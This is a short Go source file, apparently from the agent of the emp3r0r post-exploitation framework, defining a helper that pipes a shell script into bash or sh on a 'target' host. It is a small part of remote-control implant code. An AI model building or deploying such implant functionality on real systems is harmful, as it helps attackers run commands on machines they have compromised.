//go:build linux
// +build linux

package agent

import (
	"os/exec"

	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

// RunShellScript runs a bash script on target
func RunShellScript(scriptBytes []byte) (output string, err error) {
	shell := "/bin/bash"
	if !util.IsFileExist(shell) {
		shell = "/bin/sh"
	}

	cmd := exec.Command(shell)
	return feedScriptToStdin(cmd, scriptBytes)
}
